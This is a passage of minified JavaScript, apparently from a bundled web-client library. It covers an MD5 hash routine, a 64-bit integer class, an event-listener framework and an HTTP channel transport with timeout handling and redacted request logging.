,N=_+(F<<23&4294967295|F>>>9),F=M+(N^_^V)+L[13]+681279174&4294967295,M=N+(F<<4&4294967295|F>>>28),F=V+(M^N^_)+L[0]+3936430074&4294967295,V=M+(F<<11&4294967295|F>>>21),F=_+(V^M^N)+L[3]+3572445317&4294967295,_=V+(F<<16&4294967295|F>>>16),F=N+(_^V^M)+L[6]+76029189&4294967295,N=_+(F<<23&4294967295|F>>>9),F=M+(N^_^V)+L[9]+3654602809&4294967295,M=N+(F<<4&4294967295|F>>>28),F=V+(M^N^_)+L[12]+3873151461&4294967295,V=M+(F<<11&4294967295|F>>>21),F=_+(V^M^N)+L[15]+530742520&4294967295,_=V+(F<<16&4294967295|F>>>16),F=N+(_^V^M)+L[2]+3299628645&4294967295,N=_+(F<<23&4294967295|F>>>9),F=M+(_^(N|~V))+L[0]+4096336452&4294967295,M=N+(F<<6&4294967295|F>>>26),F=V+(N^(M|~_))+L[7]+1126891415&4294967295,V=M+(F<<10&4294967295|F>>>22),F=_+(M^(V|~N))+L[14]+2878612391&4294967295,_=V+(F<<15&4294967295|F>>>17),F=N+(V^(_|~M))+L[5]+4237533241&4294967295,N=_+(F<<21&4294967295|F>>>11),F=M+(_^(N|~V))+L[12]+1700485571&4294967295,M=N+(F<<6&4294967295|F>>>26),F=V+(N^(M|~_))+L[3]+2399980690&4294967295,V=M+(F<<10&4294967295|F>>>22),F=_+(M^(V|~N))+L[10]+4293915773&4294967295,_=V+(F<<15&4294967295|F>>>17),F=N+(V^(_|~M))+L[1]+2240044497&4294967295,N=_+(F<<21&4294967295|F>>>11),F=M+(_^(N|~V))+L[8]+1873313359&4294967295,M=N+(F<<6&4294967295|F>>>26),F=V+(N^(M|~_))+L[15]+4264355552&4294967295,V=M+(F<<10&4294967295|F>>>22),F=_+(M^(V|~N))+L[6]+2734768916&4294967295,_=V+(F<<15&4294967295|F>>>17),F=N+(V^(_|~M))+L[13]+1309151649&4294967295,N=_+(F<<21&4294967295|F>>>11),F=M+(_^(N|~V))+L[4]+4149444226&4294967295,M=N+(F<<6&4294967295|F>>>26),F=V+(N^(M|~_))+L[11]+3174756917&4294967295,V=M+(F<<10&4294967295|F>>>22),F=_+(M^(V|~N))+L[2]+718787259&4294967295,_=V+(F<<15&4294967295|F>>>17),F=N+(V^(_|~M))+L[9]+3951481745&4294967295,q.g[0]=q.g[0]+M&4294967295,q.g[1]=q.g[1]+(_+(F<<21&4294967295|F>>>11))&4294967295,q.g[2]=q.g[2]+_&4294967295,q.g[3]=q.g[3]+V&4294967295}n.prototype.v=function(q,M){M===void 0&&(M=q.length);const N=M-this.blockSize,L=this.C;let _=this.h,V=0;for(;V<M;){if(_==0)for(;V<=N;)i(this,q,V),V+=this.blockSize;if(typeof q=="string"){for(;V<M;)if(L[_++]=q.charCodeAt(V++),_==this.blockSize){i(this,L),_=0;break}}else for(;V<M;)if(L[_++]=q[V++],_==this.blockSize){i(this,L),_=0;break}}this.h=_,this.o+=M},n.prototype.A=function(){var q=Array((this.h<56?this.blockSize:this.blockSize*2)-this.h);q[0]=128;for(var M=1;M<q.length-8;++M)q[M]=0;M=this.o*8;for(var N=q.length-8;N<q.length;++N)q[N]=M&255,M/=256;for(this.v(q),q=Array(16),M=0,N=0;N<4;++N)for(let L=0;L<32;L+=8)q[M++]=this.g[N]>>>L&255;return q};function r(q,M){var N=u;return Object.prototype.hasOwnProperty.call(N,q)?N[q]:N[q]=M(q)}function l(q,M){this.h=M;const N=[];let L=!0;for(let _=q.length-1;_>=0;_--){const V=q[_]|0;L&&V==M||(N[_]=V,L=!1)}this.g=N}var u={};function d(q){return-128<=q&&q<128?r(q,function(M){return new l([M|0],M<0?-1:0)}):new l([q|0],q<0?-1:0)}function p(q){if(isNaN(q)||!isFinite(q))return h;if(q<0)return R(p(-q));const M=[];let N=1;for(let L=0;q>=N;L++)M[L]=q/N|0,N*=4294967296;return new l(M,0)}function f(q,M){if(q.length==0)throw Error("number format error: empty string");if(M=M||10,M<2||36<M)throw Error("radix out of range: "+M);if(q.charAt(0)=="-")return R(f(q.substring(1),M));if(q.indexOf("-")>=0)throw Error('number format error: interior "-" character');const N=p(Math.pow(M,8));let L=h;for(let V=0;V<q.length;V+=8){var _=Math.min(8,q.length-V);const F=parseInt(q.substring(V,V+_),M);_<8?(_=p(Math.pow(M,_)),L=L.j(_).add(p(F))):(L=L.j(N),L=L.add(p(F)))}return L}var h=d(0),E=d(1),C=d(16777216);a=l.prototype,a.m=function(){if(j(this))return-R(this).m();let q=0,M=1;for(let N=0;N<this.g.length;N++){const L=this.i(N);q+=(L>=0?L:4294967296+L)*M,M*=4294967296}return q},a.toString=function(q){if(q=q||10,q<2||36<q)throw Error("radix out of range: "+q);if(A(this))return"0";if(j(this))return"-"+R(this).toString(q);const M=p(Math.pow(q,6));var N=this;let L="";for(;;){const _=Y(N,M).g;N=I(N,_.j(M));let V=((N.g.length>0?N.g[0]:N.h)>>>0).toString(q);if(N=_,A(N))return V+L;for(;V.length<6;)V="0"+V;L=V+L}},a.i=function(q){return q<0?0:q<this.g.length?this.g[q]:this.h};function A(q){if(q.h!=0)return!1;for(let M=0;M<q.g.length;M++)if(q.g[M]!=0)return!1;return!0}function j(q){return q.h==-1}a.l=function(q){return q=I(this,q),j(q)?-1:A(q)?0:1};function R(q){const M=q.g.length,N=[];for(let L=0;L<M;L++)N[L]=~q.g[L];return new l(N,~q.h).add(E)}a.abs=function(){return j(this)?R(this):this},a.add=function(q){const M=Math.max(this.g.length,q.g.length),N=[];let L=0;for(let _=0;_<=M;_++){let V=L+(this.i(_)&65535)+(q.i(_)&65535),F=(V>>>16)+(this.i(_)>>>16)+(q.i(_)>>>16);L=F>>>16,V&=65535,F&=65535,N[_]=F<<16|V}return new l(N,N[N.length-1]&-2147483648?-1:0)};function I(q,M){return q.add(R(M))}a.j=function(q){if(A(this)||A(q))return h;if(j(this))return j(q)?R(this).j(R(q)):R(R(this).j(q));if(j(q))return R(this.j(R(q)));if(this.l(C)<0&&q.l(C)<0)return p(this.m()*q.m());const M=this.g.length+q.g.length,N=[];for(var L=0;L<2*M;L++)N[L]=0;for(L=0;L<this.g.length;L++)for(let _=0;_<q.g.length;_++){const V=this.i(L)>>>16,F=this.i(L)&65535,ce=q.i(_)>>>16,me=q.i(_)&65535;N[2*L+2*_]+=F*me,w(N,2*L+2*_),N[2*L+2*_+1]+=V*me,w(N,2*L+2*_+1),N[2*L+2*_+1]+=F*ce,w(N,2*L+2*_+1),N[2*L+2*_+2]+=V*ce,w(N,2*L+2*_+2)}for(q=0;q<M;q++)N[q]=N[2*q+1]<<16|N[2*q];for(q=M;q<2*M;q++)N[q]=0;return new l(N,0)};function w(q,M){for(;(q[M]&65535)!=q[M];)q[M+1]+=q[M]>>>16,q[M]&=65535,M++}function k(q,M){this.g=q,this.h=M}function Y(q,M){if(A(M))throw Error("division by zero");if(A(q))return new k(h,h);if(j(q))return M=Y(R(q),M),new k(R(M.g),R(M.h));if(j(M))return M=Y(q,R(M)),new k(R(M.g),M.h);if(q.g.length>30){if(j(q)||j(M))throw Error("slowDivide_ only works with positive integers.");for(var N=E,L=M;L.l(q)<=0;)N=ee(N),L=ee(L);var _=Q(N,1),V=Q(L,1);for(L=Q(L,2),N=Q(N,2);!A(L);){var F=V.add(L);F.l(q)<=0&&(_=_.add(N),V=F),L=Q(L,1),N=Q(N,1)}return M=I(q,_.j(M)),new k(_,M)}for(_=h;q.l(M)>=0;){for(N=Math.max(1,Math.floor(q.m()/M.m())),L=Math.ceil(Math.log(N)/Math.LN2),L=L<=48?1:Math.pow(2,L-48),V=p(N),F=V.j(M);j(F)||F.l(q)>0;)N-=L,V=p(N),F=V.j(M);A(V)&&(V=E),_=_.add(V),q=I(q,F)}return new k(_,q)}a.B=function(q){return Y(this,q).h},a.and=function(q){const M=Math.max(this.g.length,q.g.length),N=[];for(let L=0;L<M;L++)N[L]=this.i(L)&q.i(L);return new l(N,this.h&q.h)},a.or=function(q){const M=Math.max(this.g.length,q.g.length),N=[];for(let L=0;L<M;L++)N[L]=this.i(L)|q.i(L);return new l(N,this.h|q.h)},a.xor=function(q){const M=Math.max(this.g.length,q.g.length),N=[];for(let L=0;L<M;L++)N[L]=this.i(L)^q.i(L);return new l(N,this.h^q.h)};function ee(q){const M=q.g.length+1,N=[];for(let L=0;L<M;L++)N[L]=q.i(L)<<1|q.i(L-1)>>>31;return new l(N,q.h)}function Q(q,M){const N=M>>5;M%=32;const L=q.g.length-N,_=[];for(let V=0;V<L;V++)_[V]=M>0?q.i(V+N)>>>M|q.i(V+N+1)<<32-M:q.i(V+N);return new l(_,q.h)}n.prototype.digest=n.prototype.A,n.prototype.reset=n.prototype.u,n.prototype.update=n.prototype.v,CI=n,l.prototype.add=l.prototype.add,l.prototype.multiply=l.prototype.j,l.prototype.modulo=l.prototype.B,l.prototype.compare=l.prototype.l,l.prototype.toNumber=l.prototype.m,l.prototype.toString=l.prototype.toString,l.prototype.getBits=l.prototype.i,l.fromNumber=p,l.fromString=f,Js=l}).apply(typeof BA<"u"?BA:typeof self<"u"?self:typeof window<"u"?window:{});var hf=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};var TI,yd,xI,Nf,Yy,AI,PI,LI;(function(){var a,e=Object.defineProperty;function t(g){g=[typeof globalThis=="object"&&globalThis,g,typeof window=="object"&&window,typeof self=="object"&&self,typeof hf=="object"&&hf];for(var T=0;T<g.length;++T){var P=g[T];if(P&&P.Math==Math)return P}throw Error("Cannot find global object")}var n=t(this);function i(g,T){if(T)e:{var P=n;g=g.split(".");for(var O=0;O<g.length-1;O++){var te=g[O];if(!(te in P))break e;P=P[te]}g=g[g.length-1],O=P[g],T=T(O),T!=O&&T!=null&&e(P,g,{configurable:!0,writable:!0,value:T})}}i("Symbol.dispose",function(g){return g||Symbol("Symbol.dispose")}),i("Array.prototype.values",function(g){return g||function(){return this[Symbol.iterator]()}}),i("Object.entries",function(g){return g||function(T){var P=[],O;for(O in T)Object.prototype.hasOwnProperty.call(T,O)&&P.push([O,T[O]]);return P}});var r=r||{},l=this||self;function u(g){var T=typeof g;return T=="object"&&g!=null||T=="function"}function d(g,T,P){return g.call.apply(g.bind,arguments)}function p(g,T,P){return p=d,p.apply(null,arguments)}function f(g,T){var P=Array.prototype.slice.call(arguments,1);return function(){var O=P.slice();return O.push.apply(O,arguments),g.apply(this,O)}}function h(g,T){function P(){}P.prototype=T.prototype,g.Z=T.prototype,g.prototype=new P,g.prototype.constructor=g,g.Ob=function(O,te,le){for(var Ie=Array(arguments.length-2),Ze=2;Ze<arguments.length;Ze++)Ie[Ze-2]=arguments[Ze];return T.prototype[te].apply(O,Ie)}}var E=typeof AsyncContext<"u"&&typeof AsyncContext.Snapshot=="function"?g=>g&&AsyncContext.Snapshot.wrap(g):g=>g;function C(g){const T=g.length;if(T>0){const P=Array(T);for(let O=0;O<T;O++)P[O]=g[O];return P}return[]}function A(g,T){for(let O=1;O<arguments.length;O++){const te=arguments[O];var P=typeof te;if(P=P!="object"?P:te?Array.isArray(te)?"array":P:"null",P=="array"||P=="object"&&typeof te.length=="number"){P=g.length||0;const le=te.length||0;g.length=P+le;for(let Ie=0;Ie<le;Ie++)g[P+Ie]=te[Ie]}else g.push(te)}}class j{constructor(T,P){this.i=T,this.j=P,this.h=0,this.g=null}get(){let T;return this.h>0?(this.h--,T=this.g,this.g=T.next,T.next=null):T=this.i(),T}}function R(g){l.setTimeout(()=>{throw g},0)}function I(){var g=q;let T=null;return g.g&&(T=g.g,g.g=g.g.next,g.g||(g.h=null),T.next=null),T}class w{constructor(){this.h=this.g=null}add(T,P){const O=k.get();O.set(T,P),this.h?this.h.next=O:this.g=O,this.h=O}}var k=new j(()=>new Y,g=>g.reset());class Y{constructor(){this.next=this.g=this.h=null}set(T,P){this.h=T,this.g=P,this.next=null}reset(){this.next=this.g=this.h=null}}let ee,Q=!1,q=new w,M=()=>{const g=Promise.resolve(void 0);ee=()=>{g.then(N)}};function N(){for(var g;g=I();){try{g.h.call(g.g)}catch(P){R(P)}var T=k;T.j(g),T.h<100&&(T.h++,g.next=T.g,T.g=g)}Q=!1}function L(){this.u=this.u,this.C=this.C}L.prototype.u=!1,L.prototype.dispose=function(){this.u||(this.u=!0,this.N())},L.prototype[Symbol.dispose]=function(){this.dispose()},L.prototype.N=function(){if(this.C)for(;this.C.length;)this.C.shift()()};function _(g,T){this.type=g,this.g=this.target=T,this.defaultPrevented=!1}_.prototype.h=function(){this.defaultPrevented=!0};var V=(function(){if(!l.addEventListener||!Object.defineProperty)return!1;var g=!1,T=Object.defineProperty({},"passive",{get:function(){g=!0}});try{const P=()=>{};l.addEventListener("test",P,T),l.removeEventListener("test",P,T)}catch{}return g})();function F(g){return/^[\s\xa0]*$/.test(g)}function ce(g,T){_.call(this,g?g.type:""),this.relatedTarget=this.g=this.target=null,this.button=this.screenY=this.screenX=this.clientY=this.clientX=0,this.key="",this.metaKey=this.shiftKey=this.altKey=this.ctrlKey=!1,this.state=null,this.pointerId=0,this.pointerType="",this.i=null,g&&this.init(g,T)}h(ce,_),ce.prototype.init=function(g,T){const P=this.type=g.type,O=g.changedTouches&&g.changedTouches.length?g.changedTouches[0]:null;this.target=g.target||g.srcElement,this.g=T,T=g.relatedTarget,T||(P=="mouseover"?T=g.fromElement:P=="mouseout"&&(T=g.toElement)),this.relatedTarget=T,O?(this.clientX=O.clientX!==void 0?O.clientX:O.pageX,this.clientY=O.clientY!==void 0?O.clientY:O.pageY,this.screenX=O.screenX||0,this.screenY=O.screenY||0):(this.clientX=g.clientX!==void 0?g.clientX:g.pageX,this.clientY=g.clientY!==void 0?g.clientY:g.pageY,this.screenX=g.screenX||0,this.screenY=g.screenY||0),this.button=g.button,this.key=g.key||"",this.ctrlKey=g.ctrlKey,this.altKey=g.altKey,this.shiftKey=g.shiftKey,this.metaKey=g.metaKey,this.pointerId=g.pointerId||0,this.pointerType=g.pointerType,this.state=g.state,this.i=g,g.defaultPrevented&&ce.Z.h.call(this)},ce.prototype.h=function(){ce.Z.h.call(this);const g=this.i;g.preventDefault?g.preventDefault():g.returnValue=!1};var me="closure_listenable_"+(Math.random()*1e6|0),Z=0;function re(g,T,P,O,te){this.listener=g,this.proxy=null,this.src=T,this.type=P,this.capture=!!O,this.ha=te,this.key=++Z,this.da=this.fa=!1}function Ee(g){g.da=!0,g.listener=null,g.proxy=null,g.src=null,g.ha=null}function je(g,T,P){for(const O in g)T.call(P,g[O],O,g)}function G(g,T){for(const P in g)T.call(void 0,g[P],P,g)}function J(g){const T={};for(const P in g)T[P]=g[P];return T}const de="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" ");function B(g,T){let P,O;for(let te=1;te<arguments.length;te++){O=arguments[te];for(P in O)g[P]=O[P];for(let le=0;le<de.length;le++)P=de[le],Object.prototype.hasOwnProperty.call(O,P)&&(g[P]=O[P])}}function Re(g){this.src=g,this.g={},this.h=0}Re.prototype.add=function(g,T,P,O,te){const le=g.toString();g=this.g[le],g||(g=this.g[le]=[],this.h++);const Ie=_e(g,T,O,te);return Ie>-1?(T=g[Ie],P||(T.fa=!1)):(T=new re(T,this.src,le,!!O,te),T.fa=P,g.push(T)),T};function Oe(g,T){const P=T.type;if(P in g.g){var O=g.g[P],te=Array.prototype.indexOf.call(O,T,void 0),le;(le=te>=0)&&Array.prototype.splice.call(O,te,1),le&&(Ee(T),g.g[P].length==0&&(delete g.g[P],g.h--))}}function _e(g,T,P,O){for(let te=0;te<g.length;++te){const le=g[te];if(!le.da&&le.listener==T&&le.capture==!!P&&le.ha==O)return te}return-1}var Xe="closure_lm_"+(Math.random()*1e6|0),xa={};function ha(g,T,P,O,te){if(Array.isArray(T)){for(let le=0;le<T.length;le++)ha(g,T[le],P,O,te);return null}return P=mo(P),g&&g[me]?g.J(T,P,u(O)?!!O.capture:!1,te):St(g,T,P,!1,O,te)}function St(g,T,P,O,te,le){if(!T)throw Error("Invalid event type");const Ie=u(te)?!!te.capture:!!te;let Ze=on(g);if(Ze||(g[Xe]=Ze=new Re(g)),P=Ze.add(T,P,O,Ie,le),P.proxy)return P;if(O=tn(),P.proxy=O,O.src=g,O.listener=P,g.addEventListener)V||(te=Ie),te===void 0&&(te=!1),g.addEventListener(T.toString(),O,te);else if(g.attachEvent)g.attachEvent(nn(T.toString()),O);else if(g.addListener&&g.removeListener)g.addListener(O);else throw Error("addEventListener and attachEvent are unavailable.");return P}function tn(){function g(P){return T.call(g.src,g.listener,P)}const T=Ii;return g}function Ve(g,T,P,O,te){if(Array.isArray(T))for(var le=0;le<T.length;le++)Ve(g,T[le],P,O,te);else O=u(O)?!!O.capture:!!O,P=mo(P),g&&g[me]?(g=g.i,le=String(T).toString(),le in g.g&&(T=g.g[le],P=_e(T,P,O,te),P>-1&&(Ee(T[P]),Array.prototype.splice.call(T,P,1),T.length==0&&(delete g.g[le],g.h--)))):g&&(g=on(g))&&(T=g.g[T.toString()],g=-1,T&&(g=_e(T,P,O,te)),(P=g>-1?T[g]:null)&&ti(P))}function ti(g){if(typeof g!="number"&&g&&!g.da){var T=g.src;if(T&&T[me])Oe(T.i,g);else{var P=g.type,O=g.proxy;T.removeEventListener?T.removeEventListener(P,O,g.capture):T.detachEvent?T.detachEvent(nn(P),O):T.addListener&&T.removeListener&&T.removeListener(O),(P=on(T))?(Oe(P,g),P.h==0&&(P.src=null,T[Xe]=null)):Ee(g)}}}function nn(g){return g in xa?xa[g]:xa[g]="on"+g}function Ii(g,T){if(g.da)g=!0;else{T=new ce(T,this);const P=g.listener,O=g.ha||g.src;g.fa&&ti(g),g=P.call(O,T)}return g}function on(g){return g=g[Xe],g instanceof Re?g:null}var Nn="__closure_events_fn_"+(Math.random()*1e9>>>0);function mo(g){return typeof g=="function"?g:(g[Nn]||(g[Nn]=function(T){return g.handleEvent(T)}),g[Nn])}function qa(){L.call(this),this.i=new Re(this),this.M=this,this.G=null}h(qa,L),qa.prototype[me]=!0,qa.prototype.removeEventListener=function(g,T,P,O){Ve(this,g,T,P,O)};function za(g,T){var P,O=g.G;if(O)for(P=[];O;O=O.G)P.push(O);if(g=g.M,O=T.type||T,typeof T=="string")T=new _(T,g);else if(T instanceof _)T.target=T.target||g;else{var te=T;T=new _(O,g),B(T,te)}te=!0;let le,Ie;if(P)for(Ie=P.length-1;Ie>=0;Ie--)le=T.g=P[Ie],te=Ba(le,O,!0,T)&&te;if(le=T.g=g,te=Ba(le,O,!0,T)&&te,te=Ba(le,O,!1,T)&&te,P)for(Ie=0;Ie<P.length;Ie++)le=T.g=P[Ie],te=Ba(le,O,!1,T)&&te}qa.prototype.N=function(){if(qa.Z.N.call(this),this.i){var g=this.i;for(const T in g.g){const P=g.g[T];for(let O=0;O<P.length;O++)Ee(P[O]);delete g.g[T],g.h--}}this.G=null},qa.prototype.J=function(g,T,P,O){return this.i.add(String(g),T,!1,P,O)},qa.prototype.K=function(g,T,P,O){return this.i.add(String(g),T,!0,P,O)};function Ba(g,T,P,O){if(T=g.i.g[String(T)],!T)return!0;T=T.concat();let te=!0;for(let le=0;le<T.length;++le){const Ie=T[le];if(Ie&&!Ie.da&&Ie.capture==P){const Ze=Ie.listener,Xa=Ie.ha||Ie.src;Ie.fa&&Oe(g.i,Ie),te=Ze.call(Xa,O)!==!1&&te}}return te&&!O.defaultPrevented}function zt(g,T){if(typeof g!="function")if(g&&typeof g.handleEvent=="function")g=p(g.handleEvent,g);else throw Error("Invalid listener argument");return Number(T)>2147483647?-1:l.setTimeout(g,T||0)}function fo(g){g.g=zt(()=>{g.g=null,g.i&&(g.i=!1,fo(g))},g.l);const T=g.h;g.h=null,g.m.apply(null,T)}class ht extends L{constructor(T,P){super(),this.m=T,this.l=P,this.h=null,this.i=!1,this.g=null}j(T){this.h=arguments,this.g?this.i=!0:fo(this)}N(){super.N(),this.g&&(l.clearTimeout(this.g),this.g=null,this.i=!1,this.h=null)}}function ni(g){L.call(this),this.h=g,this.g={}}h(ni,L);var fe=[];function Pe(g){je(g.g,function(T,P){this.g.hasOwnProperty(P)&&ti(T)},g),g.g={}}ni.prototype.N=function(){ni.Z.N.call(this),Pe(this)},ni.prototype.handleEvent=function(){throw Error("EventHandler.handleEvent not implemented")};var X=l.JSON.stringify,ye=l.JSON.parse,we=class{stringify(g){return l.JSON.stringify(g,void 0)}parse(g){return l.JSON.parse(g,void 0)}};function Ae(){}function Qe(){}var ma={OPEN:"a",hb:"b",ERROR:"c",tb:"d"};function ra(){_.call(this,"d")}h(ra,_);function ya(){_.call(this,"c")}h(ya,_);var We={},jt=null;function Ct(){return jt=jt||new qa}We.Ia="serverreachability";function Vp(g){_.call(this,We.Ia,g)}h(Vp,_);function wi(g){const T=Ct();za(T,new Vp(T))}We.STAT_EVENT="statevent";function dr(g,T){_.call(this,We.STAT_EVENT,g),this.stat=T}h(dr,_);function nt(g){const T=Ct();za(T,new dr(T,g))}We.Ja="timingevent";function ji(g,T){_.call(this,We.Ja,g),this.size=T}h(ji,_);function Di(g,T){if(typeof g!="function")throw Error("Fn must not be null and must be a function");return l.setTimeout(function(){g()},T)}function ii(){this.g=!0}ii.prototype.ua=function(){this.g=!1};function jg(g,T,P,O,te,le){g.info(function(){if(g.g)if(le){var Ie="",Ze=le.split("&");for(let Ca=0;Ca<Ze.length;Ca++){var Xa=Ze[Ca].split("=");if(Xa.length>1){const Fa=Xa[0];Xa=Xa[1];const On=Fa.split("_");Ie=On.length>=2&&On[1]=="type"?Ie+(Fa+"="+Xa+"&"):Ie+(Fa+"=redacted&")}}}else Ie=null;else Ie=le;return"XMLHTTP REQ ("+O+") [attempt "+te+"]: "+T+`
`+P+`
`+Ie})}function Hp(g,T,P,O,te,le,Ie){g.info(function(){return"XMLHTTP RESP ("+O+") [ attempt "+te+"]: "+T+`
`+P+`
`+le+" "+Ie})}function Mi(g,T,P,O){g.info(function(){return"XMLHTTP TEXT ("+T+"): "+Dg(g,P)+(O?" "+O:"")})}function pr(g,T){g.info(function(){return"TIMEOUT: "+T})}ii.prototype.info=function(){};function Dg(g,T){if(!g.g)return T;if(!T)return null;try{const le=JSON.parse(T);if(le){for(g=0;g<le.length;g++)if(Array.isArray(le[g])){var P=le[g];if(!(P.length<2)){var O=P[1];if(Array.isArray(O)&&!(O.length<1)){var te=O[0];if(te!="noop"&&te!="stop"&&te!="close")for(let Ie=1;Ie<O.length;Ie++)O[Ie]=""}}}}return X(le)}catch{return T}}var mr={NO_ERROR:0,cb:1,qb:2,pb:3,kb:4,ob:5,rb:6,Ga:7,TIMEOUT:8,ub:9},ou={ib:"complete",Fb:"success",ERROR:"error",Ga:"abort",xb:"ready",yb:"readystatechange",TIMEOUT:"timeout",sb:"incrementaldata",wb:"progress",lb:"downloadprogress",Nb:"uploadprogress"},su;function fr(){}h(fr,Ae),fr.prototype.g=function(){return new XMLHttpRequest},su=new fr;function ho(g){return encodeURIComponent(String(g))}function Gp(g){var T=1;g=g.split(":");const P=[];for(;T>0&&g.length;)P.push(g.shift()),T--;return g.length&&P.push(g.join(":")),P}function oi(g,T,P,O){this.j=g,this.i=T,this.l=P,this.S=O||1,this.V=new ni(this),this.H=45e3,this.J=null,this.o=!1,this.u=this.B=this.A=this.M=this.F=this.T=this.D=null,this.G=[],this.g=null,this.C=0,this.m=this.v=null,this.X=-1,this.K=!1,this.P=0,this.O=null,this.W=this.L=this.U=this.R=!1,this.h=new si}function si(){this.i=null,this.g="",this.h=!1}var it={},Tt={};function Ni(g,T,P){g.M=1,g.A=hr(st(T)),g.u=P,g.R=!0,bl(g,null)}function bl(g,T){g.F=Date.now(),_i(g),g.B=st(g.A);var P=g.B,O=g.S;Array.isArray(O)||(O=[String(O)]),Sl(P.i,"t",O),g.C=0,P=g.j.L,g.h=new si,g.g=sm(g.j,P?T:null,!g.u),g.P>0&&(g.O=new ht(p(g.Y,g,g.g),g.P)),T=g.V,P=g.g,O=g.ba;var te="readystatechange";Array.isArray(te)||(te&&(fe[0]=te.toString()),te=fe);for(let le=0;le<te.length;le++){const Ie=ha(P,te[le],O||T.handleEvent,!1,T.h||T);if(!Ie)break;T.g[Ie.key]=Ie}T=g.J?J(g.J):{},g.u?(g.v||(g.v="POST"),T["Content-Type"]="application/x-www-form-urlencoded",g.g.ea(g.B,g.v,g.u,T)):(g.v="GET",g.g.ea(g.B,g.v,null,T)),wi(),jg(g.i,g.v,g.B,g.l,g.S,g.u)}oi.prototype.ba=function(g){g=g.target;const T=this.O;T&&ci(g)==3?T.j():this.Y(g)},oi.prototype.Y=function(g){try{if(g==this.g)e:{const Ze=ci(this.g),Xa=this.g.ya(),Ca=this.g.ca();if(!(Ze<3)&&(Ze!=3||this.g&&(this.h.h||this.g.la()||Dt(this.g)))){this.K||Ze!=4||Xa==7||(Xa==8||Ca<=0?wi(3):wi(2)),qi(this);var T=this.g.ca();this.X=T;var P=Mg(this);if(this.o=T==200,Hp(this.i,this.v,this.B,this.l,this.S,Ze,T),this.o){if(this.U&&!this.L){a:{if(this.g){var O,te=this.g;if((O=te.g?te.g.getResponseHeader("X-HTTP-Initial-Response"):null)&&!F(O)){var le=O;break a}}le=null}if(g=le)Mi(this.i,this.l,g,"Initial handshake response via X-HTTP-Initial-Response"),this.L=!0,ki(this,g);else{this.o=!1,this.m=3,nt(12),yn(this),_n(this);break e}}if(this.R){g=!0;let Fa;for(;!this.K&&this.C<P.length;)if(Fa=Jp(this,P),Fa==Tt){Ze==4&&(this.m=4,nt(14),g=!1),Mi(this.i,this.l,null,"[Incomplete Response]");break}else if(Fa==it){this.m=4,nt(15),Mi(this.i,this.l,P,"[Invalid Chunk]"),g=!1;break}else Mi(this.i,this.l,Fa,null),ki(this,Fa);if(Qp(this)&&this.C!=0&&(this.h.g=this.h.g.slice(this.C),this.C=0),Ze!=4||P.length!=0||this.h.h||(this.m=1,nt(16),g=!1),this.o=this.o&&g,!g)Mi(this.i,this.l,P,"[Invalid Chunked Response]"),yn(this),_n(this);else if(P.length>0&&!this.W){this.W=!0;var Ie=this.j;Ie.g==this&&Ie.aa&&!Ie.P&&(Ie.j.info("Great, no buffering proxy detected. Bytes received: "+P.length),Su(Ie),Ie.P=!0,nt(11))}}else Mi(this.i,this.l,P,null),ki(this,P);Ze==4&&yn(this),this.o&&!this.K&&(Ze==4?tm(this.j,this):(this.o=!1,_i(this)))}else bo(this.g),T==400&&P.indexOf("Unknown SID")>0?(this.m=3,nt(12)):(this.m=0,nt(13)),yn(this),_n(this)}}}catch{}};function Mg(g){if(!Qp(g))return g.g.la();const T=Dt(g.g);if(T==="")return"";let P="";const O=T.length,te=ci(g.g)==4;if(!g.h.i){if(typeof TextDecoder>"u")return yn(g),_n(g),"";g.h.i=new l.TextDecoder}for(let le=0;le<O;le++)g.h.h=!0,P+=g.h.i.decode(T[le],{stream:!(te&&le==O-1)});return T.length=0,g.h.g+=P,g.C=0,g.h.g}function Qp(g){return g.g?g.v=="GET"&&g.M!=2&&g.j.Aa:!1}function Jp(g,T){var P=g.C,O=T.indexOf(`
`,P);return O==-1?Tt:(P=Number(T.substring(P,O)),isNaN(P)?it:(O+=1,O+P>T.length?Tt:(T=T.slice(O,O+P),g.C=O+P,T)))}oi.prototype.cancel=function(){this.K=!0,yn(this)};function _i(g){g.T=Date.now()+g.H,vl(g,g.H)}function vl(g,T){if(g.D!=null)throw Error("WatchDog timer not null");g.D=Di(p(g.aa,g),T)}function qi(g){g.D&&(l.clearTimeout(g.D),g.D=null)}oi.prototype.aa=function(){this.D=null;const g=Date.now();g-this.T>=0?(pr(this.i,this.B),this.M!=2&&(wi(),nt(17)),yn(this),this.m=2,_n(this)):vl(this,this.T-g)};function _n(g){g.j.I==0||g.K||tm(g.j,g)}function yn(g){qi(g);var T=g.O;T&&typeof T.dispose=="function"&&T.dispose(),g.O=null,Pe(g.V),g.g&&(T=g.g,g.g=null,T.abort(),T.dispose())}function ki(g,T){try{var P=g.j;if(P.I!=0&&(P.g==g||Ui(P.h,g))){if(!g.L&&Ui(P.h,g)&&P.I==3){try{var O=P.Ba.g.parse(T)}catch{O=null}if(Array.isArray(O)&&O.length==3){var te=O;if(te[0]==0){e:if(!P.v){if(P.g)if(P.g.F+3e3<g.F)Pl(P),rs(P);else break e;Cr(P),nt(18)}}else P.xa=te[1],0<P.xa-P.K&&te[2]<37500&&P.F&&P.A==0&&!P.C&&(P.C=Di(p(P.Va,P),6e3));Oi(P.h)<=1&&P.ta&&(P.ta=void 0)}else Gi(P,11)}else if((g.L||P.g==g)&&Pl(P),!F(T))for(te=P.Ba.g.parse(T),T=0;T<te.length;T++){let Ca=te[T];const Fa=Ca[0];if(!(Fa<=P.K))if(P.K=Fa,Ca=Ca[1],P.I==2)if(Ca[0]=="c"){P.M=Ca[1],P.ba=Ca[2];const On=Ca[3];On!=null&&(P.ka=On,P.j.info("VER="+P.ka));const Qi=Ca[4];Qi!=null&&(P.za=Qi,P.j.info("SVER="+P.za));const ui=Ca[5];ui!=null&&typeof ui=="number"&&ui>0&&(O=1.5*ui,P.O=O,P.j.info("backChannelRequestTimeoutMs_="+O)),O=P;const di=g.g;if(di){const Tr=di.g?di.g.getResponseHeader("X-Client-Wire-Protocol"):null;if(Tr){var le=O.h;le.g||Tr.indexOf("spdy")==-1&&Tr.indexOf("quic")==-1&&Tr.indexOf("h2")==-1||(le.j=le.l,le.g=new Set,le.h&&(cu(le,le.h),le.h=null))}if(O.G){const Ll=di.g?di.g.getResponseHeader("X-HTTP-Session-Id"):null;Ll&&(O.wa=Ll,Pa(O.J,O.G,Ll))}}P.I=3,P.l&&P.l.ra(),P.aa&&(P.T=Date.now()-g.F,P.j.info("Handshake 